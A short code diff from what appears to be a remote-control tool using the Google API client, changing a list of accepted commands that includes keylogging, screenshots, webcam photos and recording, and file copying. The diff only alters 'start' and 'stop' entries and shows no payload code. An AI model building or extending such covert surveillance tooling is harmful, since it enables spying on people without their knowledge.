@@ -8,7 +8,7 @@ from googleapiclient.discovery import build
 VALID_COMMANDS = [
     "help", "list_services", "list_apps", "start_keylogger", "stop_keylogger",
     "screenshot", "webcam_photo", "restart", "shutdown", "start_record", "stop_record",
-    "start_webcam_record", "stop_webcam_record", "start", "stop", "copyfile"
+    "start_webcam_record", "stop_webcam_record", "start ", "stop ", "copyfile"
 ]
 
 def contains_valid_command(text):
